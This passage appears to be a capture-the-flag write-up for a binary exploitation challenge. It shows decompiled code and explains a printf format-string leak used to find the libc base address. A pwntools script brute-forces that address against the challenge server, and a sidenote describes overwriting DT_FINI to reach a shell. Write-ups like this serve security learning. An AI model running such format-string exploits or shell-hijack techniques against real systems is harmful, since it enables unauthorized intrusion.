  if ( &puts - 62952 != (int (**)(const char *))v1[0] )
  {
    puts("[!] Valoarea introdusa este gresita! Ne vedem la toamna.");
    exit(1);
  }
  v2 = getenv("FLAG2");
  if ( v2 )
    printf("[*] Felicitari! Diploma de absolvire a anului doi: %s\n", v2);
  else
    puts("[*] Felicitari! Contacteaza adminul pentru a obtine diploma de absolvire.");
  puts(&byte_55555555643A);
  return v5 - __readfsqword(0x28u);
}
```

We see we can input 4 characters, which are then fed directly into `printf` with no arguments, thus it will start leaking values from the stack. I fiddled locally with this quite some time trying to get a good libc address, but due to gdb/ida disabling aslr and messing with the stack, I couldn't get something good, so I wrote a quick script that sent payloads from `%1$p` to `%9$p` to the server to see what addresses I get:
`['0x7ffe0778e910', '(nil)', '(nil)', '0x7bd9ee16d3c0', '0x70', '0x7ffd593f1b78', '0xfffffff6a7d4dc60', '0x58abfc4e8000', '0x5a194af5f000']`

From local testing we knew that the first offset was on the stack, and the 6th offset was from the loader, so the only good candidate for the libc address was offset 4, so I wrote a quick script for bruteforcing the offset by aligning it to 4KB and then go down from there, until we get something. This approach yields the flag.

```Python
from pwn import *
def exploit(offset):
    p = remote("34.107.35.141", 31840)
    p.recvuntil(b"0-9: ")
    p.sendline(b"-10")
    p.recvuntil(b"valoare: ")
    p.sendline(b"+")
    r = p.recv().split(b"\n")[0].split(b"=")[-1].decode().strip()
    p.sendline(hex(int(r, 16) - 0x3dd0).encode())
    p.recvuntil(b"caractere: ")
    s = "%4$p"
    p.sendline(s.encode())
    leak = p.recvuntil(b"libc:").split(b"\n")[0].decode().strip()
    leak = (int(leak, 16)) & ~(0x1000 - 1) - offset
    p.sendline(hex(leak).encode())
    print("[*] trying value: ", hex(leak))
    try:
        r = p.recv()
        r += p.recv()
        print(r)
        if b"gresita" not in r:
            print("FLAGG")
            exit(0)
    except Exception:
        pass
    p.close()
    
for i in range(0, 0x400000, 0x1000):
    print("[*] at offset ", hex(i))
    exploit(i)

```

Flag: `CTF{m0d_s1_d0lar_1n_prin7f_p0t_f4ce_ravag11}`


##### Sidenote - nicer and simpler intented shown after

modify `DT_FINI` (`Elf64_Dyn <0Dh, 19A4h>  ; DT_FINI`) from `_DYNAMIC`/`ELF Dynamic Information` with the offset for the `win` (called `system("/bin/sh/");`) function, instead of the regular `_fini` function, and basically get a shell after year1

- or just use libc.rip or something to get the libc based on puts and patch it to test locally better :(
